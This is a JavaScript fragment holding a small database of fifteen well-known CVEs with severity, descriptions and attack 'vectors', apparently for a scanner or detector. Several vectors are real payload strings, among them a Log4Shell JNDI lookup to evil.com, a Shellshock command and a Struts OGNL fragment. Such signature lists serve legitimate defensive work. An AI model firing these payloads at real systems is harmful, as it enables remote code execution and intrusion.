...
(function () {
  ...
  const VULN_DB = [
    { id: "CVE-2021-44228", name: "Log4Shell", severity: "critical", desc: "Apache Log4j RCE via JNDI lookup", vectors: ["${jndi:ldap://evil.com/a}"] },
    { id: "CVE-2021-45046", name: "Log4j Bypass", severity: "critical", desc: "Log4Shell bypass of initial fix", vectors: ["${jndi:ldap://evil.com/a}"] },
    { id: "CVE-2022-22965", name: "Spring4Shell", severity: "critical", desc: "Spring Framework RCE via data binding", vectors: ["class.module.classLoader.resources"] },
    { id: "CVE-2017-5638", name: "Apache Struts2", severity: "critical", desc: "Struts2 RCE via Content-Type", vectors: ["%{(#_='multipart/form-data')"] },
    { id: "CVE-2019-0708", name: "BlueKeep", severity: "critical", desc: "RDP RCE", vectors: ["RDP connection"] },
    { id: "CVE-2021-26855", name: "ProxyLogon", severity: "critical", desc: "Exchange SSRF leading to RCE", vectors: ["/owa/auth/x.js"] },
    { id: "CVE-2021-27065", name: "ProxyLogon Write", severity: "critical", desc: "Exchange arbitrary file write", vectors: ["POST /ecp/proxy_logon_ecp.aspx"] },
    { id: "CVE-2022-1388", name: "F5 BIG-IP", severity: "critical", desc: "F5 iControl REST auth bypass", vectors: ["X-F5-Auth-Token", "Connection: keep-alive, X-F5-Auth-Token"] },
    { id: "CVE-2023-23397", name: "Outlook EoP", severity: "critical", desc: "Microsoft Outlook privilege escalation", vectors: ["NTLM relay via calendar invite"] },
    { id: "CVE-2023-44487", name: "HTTP/2 Rapid Reset", severity: "high", desc: "HTTP/2 protocol DDoS", vectors: ["Rapid RST_STREAM"] },
    { id: "CVE-2021-34527", name: "PrintNightmare", severity: "critical", desc: "Windows Print Spooler RCE", vectors: ["Print spooler abuse"] },
    { id: "CVE-2020-1472", name: "Zerologon", severity: "critical", desc: "Netlogon EoP", vectors: ["AES-FPB downgrade"] },
    { id: "CVE-2014-6271", name: "Shellshock", severity: "critical", desc: "Bash CGI RCE", vectors: ["() { :; }; echo; /usr/bin/id"] },
    { id: "CVE-2017-11882", name: "Equation Editor", severity: "high", desc: "Office RCE via Equation Editor", vectors: ["RTF with equation object"] },
    { id: "CVE-2023-4966", name: "CitrixBleed", severity: "critical", desc: "Citrix NetScaler info disclosure", vectors: ["NSC_SECURE cookies"] }
  ];
